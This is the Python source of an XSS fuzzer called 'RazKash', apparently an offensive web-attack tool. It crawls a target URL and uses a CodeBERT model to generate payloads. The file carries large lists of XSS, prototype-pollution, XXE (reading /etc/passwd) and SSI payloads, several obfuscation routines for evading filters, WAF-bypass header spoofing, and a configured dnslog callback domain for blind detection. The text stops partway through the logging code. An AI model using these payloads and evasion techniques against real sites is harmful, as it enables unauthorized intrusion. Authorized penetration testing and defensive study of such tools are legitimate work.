#!/usr/bin/env python3
# =============================================================================
# RazKash 𝕏SS AI Fuzzer · v9.4 Enterprise
# Author : Haroon Ahmad Awan · CyberZeus (haroon@cyberzeus.pk)
# =============================================================================


import os
import re
import ssl
import sys
import json
import time
import random
import string
import argparse
import warnings
import logging
import base64
import threading
import contextlib
import codecs
import hashlib
import xml.etree.ElementTree as ET
from pathlib import Path
from typing import List, Dict, Any, Optional
from difflib import SequenceMatcher
from concurrent.futures import ThreadPoolExecutor

import urllib.parse
import requests
from requests.adapters import HTTPAdapter
from bs4 import BeautifulSoup
from fake_useragent import UserAgent

import torch
from transformers import AutoTokenizer, AutoModelForMaskedLM, logging as hf_log

# Optional modules
try:
    import httpx  # for optional chunked/HTTP2 approach
except ImportError:
    httpx = None

try:
    from playwright.sync_api import sync_playwright, Request as PWReq
except ImportError:
    sync_playwright = None

try:
    import websocket
except ImportError:
    websocket = None


# ─────────────────────────────────────────────────────────────────────────────
#                              CONFIG
# ─────────────────────────────────────────────────────────────────────────────

VERSION            = "9.4 Enterprise"
MODEL              = "microsoft/codebert-base"
DNSLOG_DOMAIN      = "ugxllx.dnslog.cn"
LOGFILE            = Path("razkash_xss_findings.md")

TOP_K              = 7
DEF_THREADS        = 16
MAX_STATIC_PAGES   = 300
MAX_NESTED_DEPTH   = 5

RATE_LIMIT_SLEEP   = 0.05
SESSION_SPLICE_MS  = 100
JITTER_MIN_MS      = 20
JITTER_MAX_MS      = 200

VERIFY_TIMEOUT     = 9000
HTTP_TIMEOUT       = 12
HEADLESS_WAIT      = 3500

WAF_SPOOF_HEADERS = [
    {"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"},
    {"User-Agent": "curl/7.68.0"},
    {"User-Agent": "Wget/1.20.3 (linux-gnu)"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
]

# Slack & SARIF
SLACK_WEBHOOK_URL  = None
SARIF_OUTPUT_FILE  = None


# ─────────────────────────────────────────────────────────────────────────────
#                              ARGUMENTS
# ─────────────────────────────────────────────────────────────────────────────

ap = argparse.ArgumentParser(description=f"RazKash v{VERSION} · Ultimate Merged AI XSS Fuzzer")
mx = ap.add_mutually_exclusive_group()
mx.add_argument("--reflected", action="store_true", help="Only reflected XSS")
mx.add_argument("--stored",    action="store_true", help="Only stored XSS")
mx.add_argument("--blind",     action="store_true", help="Only blind XSS")
mx.add_argument("--invent",    action="store_true", help="Invent new AI-driven payloads (MASK placeholders)")
ap.add_argument("-u", "--url",             help="Target root URL (or domain)")
ap.add_argument("--autotest",              action="store_true", help="Use built-in vulnerable labs for demonstration")
ap.add_argument("--login-url",             help="Optional login endpoint URL")
ap.add_argument("--username",              help="Optional username for login")
ap.add_argument("--password",              help="Optional password for login")
ap.add_argument("--csrf-field",            default="csrf", help="CSRF field name (for form-based login)")
ap.add_argument("--threads",               type=int, default=DEF_THREADS, help="Number of fuzzing threads")
ap.add_argument("--max-pages",             type=int, default=MAX_STATIC_PAGES, help="Max static pages to crawl")
ap.add_argument("--nested-depth",          type=int, default=MAX_NESTED_DEPTH, help="Max nested iframe depth")
ap.add_argument("--simulate-spa",          action="store_true", help="Click around links/buttons (Playwright) to discover more routes")
ap.add_argument("--crawl-iframes",         action="store_true", help="Crawl iframes recursively (up to --nested-depth)")
ap.add_argument("--detect-waf",            action="store_true", help="Try to detect presence of WAF/CDN")
ap.add_argument("--polymorph",             action="store_true", help="Obfuscate payloads with random transformations")
ap.add_argument("--headed",                action="store_true", help="Run Playwright in headed mode for debugging/visual confirmations")
ap.add_argument("--debug",                 action="store_true", help="Enable debug logging")
ap.add_argument("--multi-session",         action="store_true", help="Perform multi-session stored XSS checks (two passes)")
ap.add_argument("--sarif",                 help="Write findings also to a SARIF file")
ap.add_argument("--slack-webhook",         help="Send findings also to Slack via the provided webhook URL")

args = ap.parse_args()
DEBUG = args.debug

logging.basicConfig(
    level=logging.DEBUG if DEBUG else logging.INFO,
    format="%(asctime)s %(levelname)s: %(message)s"
)
warnings.filterwarnings("ignore")
hf_log.set_verbosity_error()
os.environ["TRANSFORMERS_NO_TQDM"] = "1"
ssl._create_default_https_context = ssl._create_unverified_context


# Set up Slack / SARIF if provided
if args.slack_webhook:
    SLACK_WEBHOOK_URL = args.slack_webhook

if args.sarif:
    SARIF_OUTPUT_FILE = args.sarif


def dbg(msg: str):
    """Debug log wrapper."""
    if DEBUG:
        logging.debug(msg)


# ─────────────────────────────────────────────────────────────────────────────
#                              UTILITIES
# ─────────────────────────────────────────────────────────────────────────────

def randstr(n=12) -> str:
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))

def jitter(a=JITTER_MIN_MS, b=JITTER_MAX_MS):
    time.sleep(random.uniform(a/1000, b/1000))

def session_splice():
    time.sleep(SESSION_SPLICE_MS/1000)

def rate_limit():
    time.sleep(RATE_LIMIT_SLEEP)

def smart_url(u: str) -> str:
    """Try to prepend http/https if missing, verifying which scheme is valid."""
    if u.startswith(("http://", "https://", "file://", "ftp://")):
        return u
    for prefix in ("https://", "http://"):
        try:
            r = requests.head(prefix + u, timeout=3, verify=False)
            if r.status_code < 500:
                return prefix + u
        except:
            pass
    return "http://" + u

def random_headers() -> Dict[str, str]:
    """Generate random headers, optionally mixing in WAF spoof headers."""
    ua = UserAgent()
    h = {"User-Agent": ua.random}
    if args.detect_waf:
        h.update(random.choice(WAF_SPOOF_HEADERS))
    return h


# ─────────────────────────────────────────────────────────────────────────────
#                         AI MODEL (MASK FILLING)
# ─────────────────────────────────────────────────────────────────────────────

device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
tok    = AutoTokenizer.from_pretrained(MODEL)
mdl    = AutoModelForMaskedLM.from_pretrained(MODEL).to(device).eval()
MASK_T, MASK_ID = tok.mask_token, tok.mask_token_id

TOP_K = 7  # how many tokens to sample from top k

def ai_mutate(template: str) -> str:
    """Replace each 'MASK' token with an AI-suggested string from CodeBERT."""
    s = template
    while "MASK" in s:
        # Replace first occurrence with the actual [MASK] token
        replaced_once = s.replace("MASK", MASK_T, 1)
        ids = tok(replaced_once, return_tensors="pt").input_ids.to(device)
        with torch.no_grad():
            logits = mdl(ids).logits
        # Find position of the [MASK] token
        pos = (ids == MASK_ID).nonzero(as_tuple=True)
        if not pos[0].numel():
            break
        mask_idx = pos[1][0]
        # sample from top K
        topk = logits[0, mask_idx].topk(TOP_K).indices.tolist()
        chosen = random.choice(topk)
        w = tok.decode(chosen).strip() or "alert(1)"
        s = s.replace("MASK", w, 1)
    return s


# ─────────────────────────────────────────────────────────────────────────────
#                            POLYMORPHIC OBFUSCATION
# ─────────────────────────────────────────────────────────────────────────────

def encode_to_utf32_le(s: str) -> str:
    """Helper to encode to UTF-32-LE, then decode as latin-1 to produce weird escapes."""
    try:
        return s.encode('utf-32-le', 'ignore').decode('latin-1', 'ignore')
    except:
        return s

def triple_rot13(s: str) -> str:
    """Applying ROT13 three times is effectively ROT13 once (since 2x is original)."""
    return codecs.encode(codecs.encode(codecs.encode(s, 'rot_13'), 'rot_13'), 'rot_13')

def insert_weird_char(s: str) -> str:
    return "‼".join(s)  # random example of insertion

# We combine the previous smaller set + expansions to get a large set:
obfuscation_methods_base = [
    lambda p: p,  # 1) No change
    lambda p: "".join(f"\\x{ord(c):02x}" for c in p) if p else p,   # 2) \xHH
    lambda p: "".join(f"\\u{ord(c):04x}" for c in p) if p else p,   # 3) \uHHHH
    lambda p: base64.b64encode(p.encode()).decode(errors='ignore') if p else p,  # 4) base64
    lambda p: p.encode('utf-16','ignore').decode('latin-1','ignore') if p else p, # 5) UTF-16-latin1
    lambda p: codecs.encode(p,'rot_13') if p else p,                # 6) rot13
    lambda p: urllib.parse.quote(p) if p else p,                    # 7) url-encode
    lambda p: p.replace('<','&lt;').replace('>','&gt;') if p else p, # 8) HTML-escape < >
    lambda p: p.replace('"','&quot;').replace("'",'&#39;') if p else p,# 9) HTML-escape quotes
    lambda p: "".join(f"\\{c}" for c in p) if p else p,             # 10) slash-escape
    lambda p: "".join(f"%{ord(c):02X}" for c in p) if p else p,     # 11) %HH
    lambda p: "".join(f"&#x{ord(c):X};" for c in p) if p else p,     # 12) &#xHH;
    lambda p: "".join(f"&#{ord(c)};" for c in p) if p else p,        # 13) &#DD;
    lambda p: "".join(f"{c}/**/" for c in p) if p else p,            # 14) Insert /**/
    lambda p: p[::-1] if p else p,                                   # 15) Reverse
    lambda p: p.upper() if p else p,                                 # 16) Uppercase
    lambda p: p.lower() if p else p,                                 # 17) Lowercase
    lambda p: p.swapcase() if p else p,                              # 18) Swapcase
    lambda p: p.replace('\x00','') if p else p,                      # 19) Remove null
    lambda p: urllib.parse.quote(urllib.parse.quote(p)) if p else p, # 20) Double-URL-encode
]

def _expand_obf():
    """Generate more advanced or exotic transformations, repeated for variety."""
    expansions = [
        # A few interesting expansions:
        lambda p: "".join(f"\\0{oct(ord(c))[2:]}" for c in p) if p else p,
        lambda p: "".join(f"\\u{{{ord(c):04x}}}" for c in p) if p else p,
        lambda p: base64.urlsafe_b64encode(p.encode()).decode('ascii','ignore') if p else p,
        lambda p: encode_to_utf32_le(p) if p else p,
        lambda p: "".join(chr((ord(c)+1) % 256) for c in p) if p else p,   # shift +1
        lambda p: "".join(chr((ord(c)-1) % 256) for c in p) if p else p,   # shift -1
        lambda p: triple_rot13(p) if p else p,                             # triple rot13
        lambda p: p.replace("<","＜").replace(">","＞") if p else p,
        lambda p: re.sub(r"[aeiouAEIOU]", lambda m: m.group(0)+"\u200B", p) if p else p,
        lambda p: codecs.encode(p,"hex_codec").decode('ascii') if p else p, # hex encode
        lambda p: p[::-1].upper() if p else p,
        lambda p: insert_weird_char(p) if p else p,
        lambda p: "".join(f"\\U0000{ord(c):04X}" for c in p) if p else p,
        lambda p: p.replace("<","%3C").replace(">","%3E") if p else p,
        lambda p: "".join(c for c in p if c.isalnum()) if p else p,        # remove non-alnum
        lambda p: p.replace(" ","%20") if p else p,
        lambda p: p.replace(" ","\t") if p else p,
        lambda p: " ".join(reversed(p.split())) if p else p, 
        lambda p: "".join("\\x"+hex(ord(c))[2:].zfill(2)+"\\" for c in p) if p else p,
        lambda p: "\u202E"+p+"\u202C" if p else p,                         # RTL override
    ]

    # add a bunch of repeated expansions (we can randomize):
    # or artificially blow them up for more variety
    big_expansions = []
    for i in range(3):  # repeat expansions a few times
        big_expansions.extend(expansions)

    # also add random comment injection expansions
    for i in range(50):
        big_expansions.append(lambda p, i=i: p + f"<!--rand{i}-->" if p else p)

    return big_expansions

_extra = _expand_obf()
obfuscation_methods = obfuscation_methods_base + _extra

def polymorph(payload: str) -> str:
    """Pick one random transformation from a large list of advanced obfuscations."""
    return random.choice(obfuscation_methods)(payload)


# ─────────────────────────────────────────────────────────────────────────────
#                     BASE XSS PAYLOADS + INVENT OPTION
# ─────────────────────────────────────────────────────────────────────────────

# Original "base" from first script
BASE_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "javascript:alert('XSS')",
    "file://C:/Windows/System32/calc.exe",
    "ftp://example.com/",
    "<!--CHUNKEDXSS-->",
]

# Additional "proto pollution" and large sets from second script, plus "MASK" for AI:
EXTRA_BASE = [
    "__proto__[alert]=1",
    '{"__proto__":{"polluted":"yes"}}',
    "constructor.constructor('alert(1)')()",
    "Object.prototype.__defineGetter__('x',function(){alert(1)})",
    '__proto__.toString="alert(1)"',
    '<a href="javascript:alert(\'XSS\')">ClickMe</a>',
    '"><script>alert("XSS")</script>',
    "<img src=x onerror=confirm('XSS')>",
    "<iframe srcdoc='<script>alert(`XSS`)</script>'></iframe>",
        '<script>alert("XSS")</script>',
    '<img src="x" onerror="alert(\'XSS\')" />',
    '<a href="javascript:alert(\'XSS\')">Click Me</a>',
    '"><script>alert("XSS")</script>',
    '"><img src=x onerror=alert("XSS")>',
    '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
    'javascript:alert("XSS")',
    'javascript:confirm("XSS")',
    'javascript:eval("alert(\'XSS\')")',
    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
    '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
    '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
    '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
    '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
    '<img src=x onerror=confirm("XSS")>',
    '<img src=x onerror=eval("alert(\'XSS\')")>',
    '\'; alert(String.fromCharCode(88,83,83))//',
    '<a foo=a src="javascript:alert(\'XSS\')">Click Me</a>',
    '<a foo=a href="javascript:alert(\'XSS\')">Click Me</a>',
    '<img foo=a src="javascript:alert(\'XSS\')">',
    '<img foo=a onerror="alert(\'XSS\')">',
    '<img src="http://example.com/image.jpg">',
    '<img src="">',
    '<img>',
    '<img src=x onerror=alert("XSS")>',
    '<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',
    '&#34;><img src=x onerror=alert(\'XSS\')>',
    '&#34><img src=x onerror=alert(\'XSS\')>',
    '&#x22><img src=x onerror=alert(\'XSS\')>',
    '<style>li {list-style-image: url("javascript:alert(\'XSS\')");}</style><ul><li></ul>',
    '<img src="vbscript:alert(\'XSS\')">',
    '<svg><p><style><img src=1 href=1 onerror=alert(1)></p></svg>',
    '<a href="javascript:void(0)" onmouseover="alert(1)">Click Me</a>',
    '<BODY ONLOAD=alert(\'XSS\')>',
    '<img onmouseover="alert(\'XSS\')" src="x">',
    '<s<Sc<script>ript>alert(\'XSS\')</script>',
    '<TABLE><TD BACKGROUND="javascript:alert(\'XSS\')">',
    '<TD BACKGROUND="javascript:alert(\'XSS\')">',
    '<DIV STYLE="width: expression(alert(\'XSS\'));">',
    '<BASE HREF="javascript:alert(\'XSS\');//">',
    '<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/xss.html"></OBJECT>',
    '<!--#exec cmd="/bin/echo \'<SCR\'+\'IPT>alert("XSS")</SCR\'+\'IPT>\'"-->',
    '<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert(\'XSS\')<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>',
    '<SWF><PARAM NAME=movie VALUE="javascript:alert(\'XSS\')"></PARAM><embed src="javascript:alert(\'XSS\')"></embed></SWF>',
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
]

if args.invent:
    # Add the placeholder for AI expansion
    EXTRA_BASE.append("MASK")

BASE_PAYLOADS = list(set(BASE_PAYLOADS + EXTRA_BASE))


# Advanced "stored" from first script (like SW, WASM, JSON-LD, SSE, etc.)
stored_payloads_v1 = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    """<script>
       if('serviceWorker' in navigator){
         navigator.serviceWorker.register('data:application/javascript;base64,KGZ1bmN0aW9uKCl7YWxlcnQoJ1NlcnZpY2UgV29ya2VyIFBvaXNvbmVkIScpfSkoKQ==')
           .then(()=>alert('SW Pwned!'));
       }
       </script>""",
    """<script>
       if(WebAssembly && WebAssembly.instantiateStreaming){
         WebAssembly.instantiateStreaming(fetch('data:application/wasm;base64,AGFzbQEAAAABBgFgAX8BfwMCAQA='))
         .then(()=>alert('WASM XSS!')).catch(()=>{});
       }
       </script>""",
    """<script type="application/ld+json">
       {"@context":"http://schema.org","@type":"Person","name":"<img src=x onerror=alert('XSS')>"}
       </script>""",
    """<div itemscope itemtype="http://schema.org/Product">
       <span itemprop="name"><svg onload=alert('XSS')></svg></span>
       </div>""",
    """<div vocab="http://schema.org/" typeof="Person">
       <span property="name" content="<img src=x onerror=alert('XSS')>"></span>
       </div>""",
    """<script>
       if(navigator.gpu){ navigator.gpu.requestAdapter().then(a=>alert('WebGPU XSS')); }
       </script>""",
    """<script>
       if(navigator.xr){ navigator.xr.requestSession('immersive-vr').then(()=>alert('WebXR XSS'),()=>{}); }
       </script>""",
    """<script>
       if(typeof WebTransport==='function'){
         (async()=>{
           try{ let wt=new WebTransport('https://example.com');
           await wt.ready; alert('WebTransport XSS');}catch(e){}
         })();
       }
       </script>""",
    """<script>
       new BroadcastChannel('xss_channel').postMessage('HelloXSS');
       let sse=new EventSource('data:text/event-stream;charset=utf-8,');
       sse.onmessage=e=>alert('SSE XSS '+e.data);
       </script>"""
]

# Additional stored from second script with dozens of variations (including proto-pollution).
# For brevity, we will unify into one large set:
stored_payloads_v2 = [
    '<script>alert(1)</script>',
    '<script>alert("XSS")</script>',
    '__proto__[alert]=1',
    '{"__proto__":{"polluted":"yes"}}',
    "constructor.constructor('alert(1)')()",
    "Object.prototype.__defineGetter__('x',function(){alert(1)})",
    '__proto__.toString="alert(1)"',
    "<img src=x onerror=alert('XSS')>",
    "<a href=javascript:alert('XSS')>XSS Link</a>",
    "<iframe src=javascript:alert('XSS')></iframe>",
    "<body onload=alert('XSS')>",
    "<svg onload=alert('XSS')></svg>",
    "<img src=x onload=alert(1)>",
    "<svg><script>alert(\"XSS\")</script></svg>",
    "<style>*{background:url(\"javascript:alert('XSS')\")}</style>",
    "<iframe srcdoc=\"<script>alert('XSS')</script>\"></iframe>",
    "<img src=data: onerror=alert('XSS')>",
    '<math><annotation encoding="application/ecmascript">alert("XSS")</annotation></math>',
        # 1–10: Simple <script> and common payloads
    '<script>alert(1)</script>',
    "<script>alert('XSS')</script>",
    '"><script>alert(document.domain)</script>',
    '<SCRIPT SRC=//example.com/xss.js></SCRIPT>',
    "<script>confirm('XSS')</script>",
    '<SCRIPT>alert("XSS");</SCRIPT>',
    "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
    "<script>console.log('XSS');alert('XSS');</script>",
    '<script type="text/javascript">alert(/XSS/)</script>',
    "';alert('XSS');//",

    # 11–20: Image / Event Handler
    "<img src=x onerror=alert('XSS')>",
    "<img src=1 onerror=alert(/XSS/)>",
    '"><img src=x onerror=alert(\'XSS\')>',
    "<img src=\"javascript:alert('XSS')\">",
    "<img src=\"invalid\" onerror=\"alert('XSS')\">",
    '<IMG LOWSRC="javascript:alert(\'XSS\')">',
    "<img src=javascript:alert('XSS')>",
    "<img src=1 onload=alert(1)>",
    '"><img src=doesnotexist onerror=confirm(\'XSS\')>',
    "<img src=data: onerror=alert('XSS')>",

    # 21–30: Anchor / javascript: Schemes
    "<a href=\"javascript:alert('XSS')\">Click Me</a>",
    '"><a href="javascript:alert(/XSS/)">link</a>',
    "<a href=javascript:alert('XSS')>XSS Link</a>",
    "<a href=JaVaScRiPt:alert('XSS')>mixed-case link</a>",
    "<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg>Base64Load</a>",
    "<a href=javascript:console.log('XSS');alert('XSS')>Debug+Alert</a>",
    "<a href=\"ja    vascript:alert('XSS')\">whitespace trick</a>",
    "<a href=\"javascript:eval('alert(XSS)')\">eval link</a>",
    "<a href=\"javascript:prompt('Stored XSS')\">Prompt link</a>",
    "\"><a href=javascript:alert('XSS') style=position:absolute;top:0;left:0>Overlay</a>",

    # 31–40: Iframe / Form / Body
    "<iframe src=\"javascript:alert('XSS')\"></iframe>",
    "<iframe srcdoc=\"<script>alert('XSS')</script>\"></iframe>",
    "<form action=\"javascript:alert('XSS')\"><input type=submit></form>",
    "<body onload=alert('XSS')>",
    "<body background=javascript:alert('XSS')>",
    "<form><button formaction=\"javascript:alert('XSS')\">XSS</button></form>",
    "\"><iframe src=javascript:alert(1)>",
    "<iframe/onload=alert('XSS')>",
    "<form action=\"\" onsubmit=alert(\"XSS\")><input type=submit value=\"Go\"></form>",
    "<BODY ONRESIZE=alert(\"XSS\")>resize me</BODY>",

    # 41–50: SVG / XML / MathML
    '<svg onload=alert("XSS")></svg>',
    '<svg><script>alert("XSS")</script></svg>',
    "<svg><desc><![CDATA[</desc><script>alert('XSS')</script>]]></svg>",
    "<svg><foreignObject><script>alert('XSS')</script></foreignObject></svg>",
    "<svg><p><style><img src=x onerror=alert(\"XSS\")></p></svg>",
    '<math><mtext></mtext><annotation encoding="application/ecmascript">alert("XSS")</annotation></math>',
    "<?xml version=\"1.0\"?><root><![CDATA[<script>alert('XSS')</script>]]></root>",
    "<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg><a xlink:href=\"javascript:alert('XSS')\">CLICK</a></svg>",
    "\"><svg/onload=confirm('XSS')>",

    # 51–60: CSS, Meta
    '<style>*{background:url("javascript:alert(\'XSS\')");}</style>',
    "<style>@import 'javascript:alert(\"XSS\")';</style>",
    "<style>li {list-style-image: url(\"javascript:alert('XSS')\");}</style><ul><li>Test",
    "<div style=\"width: expression(alert('XSS'))\">",
    '<style>body:after { content:"XSS"; }</style>',
    "<style onload=alert(\"XSS\")></style>",
    "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">",
    "<link rel=\"stylesheet\" href=\"javascript:alert('XSS')\">",
    "<style>@keyframes xss { from {color: red;} to {color: green;} } div { animation: xss 5s infinite; }</style>",
    "<meta charset=\"x-unknown\" content=\"javascript:alert('XSS')\">",

    # 61–70: Event Handlers & Rare Tags
    "<img src=x onmouseover=alert('XSS')>",
    "<marquee onstart=alert('XSS')>Scrolling Text</marquee>",
    "<table background=\"javascript:alert('XSS')\"><tr><td>XSS!</td></tr></table>",
    "<audio src onerror=alert('XSS')></audio>",
    "<video src onerror=confirm('XSS')></video>",
    "<object data=\"javascript:alert('XSS')\"></object>",
    "<embed src=\"javascript:alert('XSS')\"></embed>",
    "<applet code=javascript:alert('XSS')></applet>",
    "<details ontoggle=alert('XSS')>Click to toggle</details>",
    "<textarea autofocus onfocus=alert(\"XSS\")>Focus me</textarea>",

    # 71–80: Attribute Escapes
    "\" autofocus onfocus=alert('XSS') foo=\"",
    "' onmouseover=alert(\"XSS\") '",
    "<!--\"><script>alert('XSS')</script>",
    "-->\"><script>alert('XSS')</script>",
    "<!--#exec cmd=\"/bin/echo '<script>alert(XSS)</script>'\"-->",
    "<title onpropertychange=alert('XSS')>TitleXSS</title>",
    "<blink onclick=alert(\"XSS\")>Blink me</blink>",
    "\"--><script>alert('XSS')</script><!--\"",
    "'-->\"><img src=x onerror=alert(\"XSS\")>",
    "--><svg/onload=alert('XSS')><!",

    # 81–90: javascript: / data URIs
    "javascript:alert(\"XSS\")",
    "JaVaScRiPt:alert(\"XSS\")",
    "data:text/html,<script>alert(\"XSS\")</script>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "\"><iframe srcdoc=\"data:text/html,<script>alert('XSS')</script>\"></iframe>",
    "\"><script>window.location='javascript:alert(\"XSS\")'</script>",
    "<a href=\"data:text/html;charset=utf-8,<script>alert(1)</script>\">Data Link</a>",
    "<img src=data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+>",
    "\"><object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>",
    "<video src=\"data:video/mp4;base64,invalid\" onerror=\"alert('XSS')\"></video>",

    # 91–100: Obfuscated
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "\"><script>alert(unescape('%58%53%53'))</script>",
    "<script>eval(\"&#97;&#108;&#101;&#114;&#116;&#40;&#39;XSS&#39;&#41;\")</script>",
    "<svg><script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script></svg>",
    "<iframe srcdoc=\"%3Cscript%3Ealert('XSS')%3C%2Fscript%3E\"></iframe>",
    "\"><img src=x oneRrOr=eval('al'+'ert(1)')>",
    "<img src=x onerror=\"this['al'+'ert']('XSS')\">",
    "<svg onload='fetch(\"data:,\"+String.fromCharCode(97,108,101,114,116,40,49,41))'></svg>",
    "<style>*{background-image:url(\"data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+\")} </style>",
    "<img src=1 onerror='eval(decodeURIComponent(\"%61%6c%65%72%74%28%31%29\"))'>"
    # etc. (truncated for brevity, but you can unify as many as desired)
]

all_stored_payloads = list(set(stored_payloads_v1 + stored_payloads_v2))


# ─────────────────────────────────────────────────────────────────────────────
#                        ERROR DETECTION / PATTERNS
# ─────────────────────────────────────────────────────────────────────────────

SQL_ERROR_RE = re.compile(r"(SQL syntax|MySQL|syntax error|Error:|MySQL server version for the right syntax to use near|SQL syntax|unclosed quotation|InnoDB|PostgreSQL|Error|ERROR|error )", re.I)


# ─────────────────────────────────────────────────────────────────────────────
#                            VERIFICATION
#   (Advanced: uses Playwright if available, with screenshot capture,
#    hooking alert/confirm/prompt, mutation observer, shadow DOM, etc.)
# ─────────────────────────────────────────────────────────────────────────────

def verify(url: str, method: str, data: Any, is_json: bool=False) -> bool:
    """
    Launch a headless/headed browser to detect script events, using advanced hooking.
    Takes a screenshot before and after, logs reason on window._xss_reason if triggered,
    and — when triggered — appends an entry into LOGFILE (razkash_xss_findings.md).
    Falls back to a simple reflected-payload check if Playwright fails.
    """
    # Advanced Playwright-based detection
    if sync_playwright:
        import hashlib
        screenshot_dir = Path("screenshots")
        screenshot_dir.mkdir(exist_ok=True)

        signature = hashlib.md5((url + json.dumps(data, sort_keys=True)).encode()).hexdigest()[:8]
        try:
            with sync_playwright() as p:
                browser = p.chromium.launch(
                    headless=not args.headed,
                    args=["--disable-web-security", "--ignore-certificate-errors", "--no-sandbox"]
                )
                ctx = browser.new_context(
                    ignore_https_errors=True,
                    user_agent=UserAgent().random
                )
                page = ctx.new_page()

                # Inject hooking script
                page.add_init_script("""
                    window._xss_triggered = false;
                    window._xss_reason = "none";
                    function mark(reason){
                        window._xss_triggered = true;
                        window._xss_reason = reason || "unknown";
                    }
                    ['alert','confirm','prompt'].forEach(fn => {
                        const orig = window[fn];
                        window[fn] = (...args) => { mark(fn); return orig(...args); };
                    });
                    document.addEventListener('securitypolicyviolation', () => mark('csp-violation'));
                    new MutationObserver(muts => {
                        muts.forEach(m => {
                            m.addedNodes.forEach(n => {
                                if(n.outerHTML && /(script|onerror|iframe|svg)/i.test(n.outerHTML)) {
                                    mark('mutation-observer');
                                }
                            });
                        });
                    }).observe(document.documentElement, {childList:true,subtree:true});
                    setTimeout(() => {
                        const s = document.createElement('script');
                        s.innerHTML = 'mark("inline-script-test")';
                        document.body.appendChild(s);
                        const ifr = document.createElement('iframe');
                        ifr.srcdoc = '<script>parent.mark("iframe-srcdoc")</script>';
                        document.body.appendChild(ifr);
                    }, 1500);
                """)

                # ─── FIXED: only dismiss dialogs, do NOT call undefined mark()
                page.on("dialog", lambda d: d.dismiss())

                # Perform the actual request
                if method.upper() == "GET":
                    qs = urllib.parse.urlencode(data)
                    full_url = f"{url}?{qs}" if qs else url
                    page.goto(full_url, timeout=VERIFY_TIMEOUT, wait_until="networkidle")
                else:
                    page.goto(url, timeout=VERIFY_TIMEOUT, wait_until="networkidle")
                    hdrs = {"Content-Type": "application/json"} if is_json else {"Content-Type": "application/x-www-form-urlencoded"}
                    body = json.dumps(data) if is_json else urllib.parse.urlencode(data)
                    page.evaluate("(u,h,b) => fetch(u, {method:'POST',headers:h,body:b})", url, hdrs, body)
                    page.wait_for_timeout(1500)

                # Take screenshots before + after
                before_file = screenshot_dir / f"{signature}_before.png"
                page.screenshot(path=str(before_file), full_page=True)
                page.wait_for_timeout(HEADLESS_WAIT)
                after_file = screenshot_dir / f"{signature}_after.png"
                page.screenshot(path=str(after_file), full_page=True)

                # Check whether our init-script set the flag
                triggered = page.evaluate("window._xss_triggered")
                reason    = page.evaluate("window._xss_reason")
                dbg(f"[verify] triggered={triggered}, reason={reason}, screenshots=({before_file.name},{after_file.name})")

                if triggered:
                    entry = (
                        f"- **XSS** {method} `{url}` "
                        f"reason={reason} screenshots=({before_file.name},{after_file.name})\n"
                    )
                    with log_lock:
                        old = LOGFILE.read_text("utf-8") if LOGFILE.exists() else ""
                        LOGFILE.write_text(old + entry, "utf-8")
                    logging.info(entry.strip())

                page.close()
                ctx.close()
                browser.close()
                return bool(triggered)

        except Exception as ex:
            dbg(f"[verify: playwright error] {ex}")
            # fall through to reflected check

    # ─── Fallback: simple reflected-payload check in HTTP response
    try:
        if method.upper() == "GET":
            resp = SESSION.get(url, params=data, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)
        else:
            if is_json:
                resp = SESSION.post(url, json=data, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)
            else:
                resp = SESSION.post(url, data=data, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)

        body = resp.text or ""
        for v in (data.values() if isinstance(data, dict) else []):
            if isinstance(v, str) and v in body:
                dbg("[verify: reflected] payload found in response")
                entry = f"- **XSS** {method} `{url}` reflected-payload={v[:50]}...\n"
                with log_lock:
                    old = LOGFILE.read_text("utf-8") if LOGFILE.exists() else ""
                    LOGFILE.write_text(old + entry, "utf-8")
                logging.info(entry.strip())
                return True

    except Exception as ex:
        dbg(f"[verify: fallback error] {ex}")

    return False




# ─────────────────────────────────────────────────────────────────────────────
#                            LOGGING (Hits, SARIF, Slack)
# ─────────────────────────────────────────────────────────────────────────────

if not LOGFILE.exists():
    LOGFILE.write_text(f"# RazKash Findings v{VERSION}\n\n", "utf-8")

_hits = set()
log_lock = threading.Lock()

sarif_results = []
sarif_lock = threading.Lock()

def log_hit(url, method, payload, params=None, extra=""):
    """Log a successful XSS hit. Also handle Slack & SARIF if configured."""
    params = params or []
    entry = f"- **XSS** {method} `{url}` param={params} payload=`{payload}` {extra}\n"

    with log_lock:
        if entry in _hits:
            return
        _hits.add(entry)
        # Write to MD
        old = ""
        if LOGFILE.exists():
            old = LOGFILE.read_text("utf-8")
        LOGFILE.write_text(old + entry, "utf-8")

